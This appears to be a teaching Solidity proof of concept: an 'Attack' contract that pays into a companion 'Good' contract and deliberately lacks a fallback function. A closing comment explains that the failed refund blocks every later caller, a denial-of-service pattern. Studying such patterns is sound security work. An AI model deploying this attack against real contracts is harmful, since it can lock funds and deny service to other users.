//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./Good.sol";

contract Attack {
    good Good;

    constructor(address _good) {
        Good = good(_good);
    }

    function attack() public payable {
        Good.price{value: msg.value}();
    }
}// since there is no fallback function the if(sent) in good.sol can not be true, no further address would be able to call after attack.sol